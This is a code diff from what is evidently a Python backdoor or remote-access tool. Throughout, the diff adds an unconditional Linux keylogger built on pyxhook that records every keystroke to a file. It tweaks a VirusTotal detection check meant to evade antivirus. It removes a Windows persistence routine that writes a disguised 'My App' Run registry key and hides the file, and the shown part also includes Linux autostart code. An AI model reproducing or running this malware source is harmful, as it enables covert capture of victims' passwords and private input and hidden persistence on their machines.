@@ -5,62 +5,59 @@ from subprocess import Popen, PIPE, STDOUT
 from wifi import Cell, Scheme
 from Crypto.Cipher import AES
 
-if platform.system() == "Windows":
-    hookwin = "Can't import pyxhook"
-else:
-    import pyxhook
-    def kbevent(event):
-        Wevent = str(event) + "\n"
-        log.write(Wevent)
+import pyxhook
+def kbevent(event):
+    Wevent = str(event) + "\n"
+    log.write(Wevent)
 
-    global HKthread
-    global hookman
-    global log
-    hookman = pyxhook.HookManager()
-    HKthread = thread
-    HKstat = "OFF"
+global HKthread
+global hookman
+global log
+hookman = pyxhook.HookManager()
+HKthread = thread
+HKstat = "OFF"
 
-    def LinuxHOOKER(threadName, running):
-        hookman.KeyDown = kbevent
-        hookman.HookKeyboard()
-        hookman.start()
-        while 1:
-            time.sleep(0.1)
+def LinuxHOOKER(threadName, running):
+    hookman.KeyDown = kbevent
+    hookman.HookKeyboard()
+    hookman.start()
+    while 1:
+        time.sleep(0.1)
 
-    def LinuxHOOK(status, namefile):
-        global HKstat
-        if status == "check":
-            return HKstat
-        elif status == "ON":
-            if status == HKstat:
-                report = "Already running"
-                return report
-            else:
-                try:
-                    HKthread.start_new_thread(LinuxHOOKER, ("HK-1",1))
-                    log = open(namefile, 'wa')
-                    HKstat = "ON"
-                    return HKstat
-                except:
-                    HKstat = "Error: unable to start thread"
-                    return HKstat
-        elif status == "OFF":
-            if status == HKstat:
-                report = "Already stopped"
-                return report
-            else:
-                try:
-                    hookman.cancel() #and so HKthread.exit()
-                    time.sleep(0.1)
-                    log.close()
-                    HKstat = "OFF"
-                    return HKstat
-                except:
-                    statReturn = "Something went wrong, HKstat= " + HKstat
-                    return statReturn
+def LinuxHOOK(status, namefile):
+    global HKstat
+    if status == "check":
+        return HKstat
+    elif status == "ON":
+        if status == HKstat:
+            report = "Already running"
+            return report
         else:
-            statReturn = "Something went wrong, HKstat= " + HKstat
-            return statReturn
+            try:
+                HKthread.start_new_thread(LinuxHOOKER, ("HK-1",1))
+                log = open(namefile, 'wa')
+                HKstat = "ON"
+                return HKstat
+            except:
+                HKstat = "Error: unable to start thread"
+                return HKstat
+    elif status == "OFF":
+        if status == HKstat:
+            report = "Already stopped"
+            return report
+        else:
+            try:
+                hookman.cancel() #and so HKthread.exit()
+                time.sleep(0.1)
+                log.close()
+                HKstat = "OFF"
+                return HKstat
+            except:
+                statReturn = "Something went wrong, HKstat= " + HKstat
+                return statReturn
+    else:
+        statReturn = "Something went wrong, HKstat= " + HKstat
+        return statReturn
 
 class PKCS7Encoder():
     class InvalidBlockSizeError(Exception):
@@ -105,7 +102,7 @@ with open(os.path.basename(__file__) , "rb") as thisFile:
 # extract some data
 #response_dict = simplejson.loads(jReport)
 #rPositives = response_dict.get("positives",{})
-rPositives = 0
+rPositives = 0 #just for testing
 # check VT stauts
 if str(rPositives) != "{}":
     if rPositives == 0:
@@ -147,17 +144,6 @@ def LinuxAutoStart():
     #EXEC("chattr +i "+file) you're not r00t
         status = "ok"
     else:
-        status = "error"
-    return status
-
-# autostart for Windows
-def WindowsAutoStart():
-    try:
-        name = inspect.getfile(inspect.currentframe());
-        EXEC("REG ADD \"HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\" /V \"My App\" /t REG_SZ /F /D "+os.path.dirname(os.path.abspath(__file__))+name)
-        EXEC("attrib +h" + name)
-        status = "ok"
-    except:
         status = "error"
     return status
 
